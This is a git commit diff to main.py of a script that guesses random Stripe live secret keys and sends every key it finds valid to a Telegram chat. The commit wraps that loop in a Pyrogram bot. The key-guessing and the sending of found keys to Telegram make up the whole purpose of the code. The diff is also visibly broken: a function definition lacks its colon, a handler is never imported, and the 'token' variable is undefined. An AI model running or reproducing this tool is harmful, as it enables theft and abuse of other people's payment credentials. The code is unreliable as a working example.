29bf27f8ce0daf3b7974263befd7d9ef859c826a
Mr Vishal <67860986+Mrvishal2k2@users.noreply.github.com>
2021-10-25 16:33:47 +0530

    Update main.py

--- main.py
+++ main.py
@@ -1,7 +1,29 @@
-import requests, random, string, time, os
+import requests, random, string, time, os, asyncio,logging 
+from pyrogram import Client, filters
+from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
+from plugins import backgen
 
-token = os.environ.get("BOT_TOKEN")
+if os.path.exists("logs/Log.txt"):
+    with open("logs/Log.txt", "r+") as f_d:
+        f_d.truncate(0)
+
+logging.basicConfig(level=logging.DEBUG,
+           format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
+           datefmt="%d-%b-%y %H:%M:%S",
+           handlers=[RotatingFileHandler(
+            "logs/Log.txt",
+            maxBytes=1000000,
+            backupCount=10),logging.StreamHandler()])
+
+log = logging.getLogger(__name__)
+logging.getLogger("pyrogram").setLevel(logging.WARNING)
+logging.getLogger("requests").setLevel(logging.WARNING)
+
+
+bot_token = os.environ.get("BOT_TOKEN")
 chatid = os.environ.get("FORWARD_ID")
+api_id = os.environ.get("APIID")
+api_hash = os.environ.get("APIHASH")
 
 def long_key():
   skkey = random.choice(['sk_live_51H', 'sk_live_51J'])+''.join(random.choices( string.digits + string.ascii_letters, k = 96))
@@ -21,8 +43,33 @@ def short_key():
     print(f"LIVE > {skkey}")
     requests.get(url=f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chatid}&text=LIVE > {skkey}")
     
-while True:
-  long_key()
-  #time.sleep(0.5) #if your heroku account keeps getting banned
-  short_key()
+
+class Bot(Client):
+
+    def __init__(self):
+        super().__init__(
+            session_name="BOT",
+            api_id=api_id,
+            api_hash=api_hash,
+            bot_token=bot_token,
+            plugins={"root": "plugins"},
+        )
+
+    async def start(self):
+        await super().start()
+        asyncio.get_event_loop().create_task(backgen())
+        log.info("<<[Bot Started]>>")
+    async def stop(self, *args):
+        await super().stop()
+        log.info("<<[Bot Stopped]>>")
+
+app = Bot()
+app.run()
+
+
+async def backgen()
+    while True:
+      long_key()
+      #time.sleep(0.5) #if your heroku account keeps getting banned
+      short_key()
     
